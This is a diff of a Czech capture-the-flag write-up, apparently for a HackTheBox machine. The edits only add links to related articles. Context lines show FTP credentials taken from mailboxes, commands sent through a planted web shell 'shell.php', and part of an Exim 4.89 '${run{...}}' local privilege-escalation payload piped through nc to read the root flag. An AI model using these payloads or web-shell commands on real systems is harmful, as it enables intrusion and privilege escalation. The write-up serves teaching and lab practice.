@@ -32,7 +32,7 @@ nmap -p $ports -A -sC -sV -v $IP
 80/tcp open  http    Apache httpd 2.4.25
 ```
 
-WHOIS služba vracela i část chybové hlášky z MariaDB. To je silná indicie, že dotaz končí v databázi a že má smysl ověřit injection.
+WHOIS služba vracela i část chybové hlášky z MariaDB. To je silná indicie, že dotaz končí v databázi a že má smysl ověřit injection. Obecnější kontext podobných infrastrukturních leaků rozebírám i v článku [WHOIS, DNS a AXFR jako reálná útočná plocha](/techniky/whois-dns-a-axfr-jako-realna-utokova-plocha).
 
 ### WHOIS a nové virtuální hosty
 
@@ -93,7 +93,7 @@ user: ib01ftp
 pass: YhgRt56_Ta
 ```
 
-Tady je důležité nepřeskočit význam toho zjištění. Poštovní schránky nevydaly „jen další heslo“, ale přímý přístup k interním incidentním souborům přes FTP.
+Tady je důležité nepřeskočit význam toho zjištění. Poštovní schránky nevydaly „jen další heslo“, ale přímý přístup k interním incidentním souborům přes FTP. Přesně tenhle přechod od provozního artefaktu k dalšímu účtu rozebírám i v článku [Metadata, logy, incidentní a forenzní artefakty jako zdroj přístupů](/techniky/metadata-logy-incidentni-a-forenzni-artefakty-jako-zdroj-pristupu).
 
 ### Incidentní artefakty a reuse hesla
 
@@ -127,7 +127,7 @@ I když `shell.php` už uměla vykonávat příkazy, pro další práci byl důl
 
 ### Lokální Exim 4.89
 
-Na hostu běžel Exim 4.89 a z command execution v `shell.php` šlo spouštět lokální procesy proti `127.0.0.1:25`. To je důležitá kombinace: Exim nebylo nutné vystavovat jako vzdálené RCE, stačilo ho zneužít lokálně z už získaného code execution na stejném serveru.
+Na hostu běžel Exim 4.89 a z command execution v `shell.php` šlo spouštět lokální procesy proti `127.0.0.1:25`. To je důležitá kombinace: Exim nebylo nutné vystavovat jako vzdálené RCE, stačilo ho zneužít lokálně z už získaného code execution na stejném serveru. Přesně tento princip popisuje i článek [Lokálně dostupné služby po footholdu: localhost není boundary](/techniky/lokalne-dostupne-sluzby-po-footholdu-localhost-neni-boundary).
 
 Předpřipravený payload využíval `${run{...}}` v adrese příjemce a nechal Exim zapsat obsah `root.txt` do dočasného souboru:
 
@@ -138,7 +138,7 @@ touch /dev/shm/flag
  sleep 0.1; echo DATA; sleep 0.1; echo "Received: 1"; echo ""; echo "."; echo QUIT) | nc 127.0.0.1 25
 ```
 
-Protože bylo nepraktické celý payload posílat ručně přes URL, šel nejdřív převést do base64 a na cíli dekódovat a spustit přes `shell.php`. Následně už stačilo přečíst výstup:
+Protože bylo nepraktické celý payload posílat ručně přes URL, šel nejdřív převést do base64 a na cíli dekódovat a spustit přes `shell.php`. Následně už stačilo přečíst výstup. Praktickou roli podobných jednoduchých TCP klientů a listenerů rozebírám i v článku [Netcat a nc](/nastroje/netcat-a-nc):
 
 ```bash
 curl "http://sec03.rentahacker.htb/shell.php?hidden=cat+/dev/shm/flag"
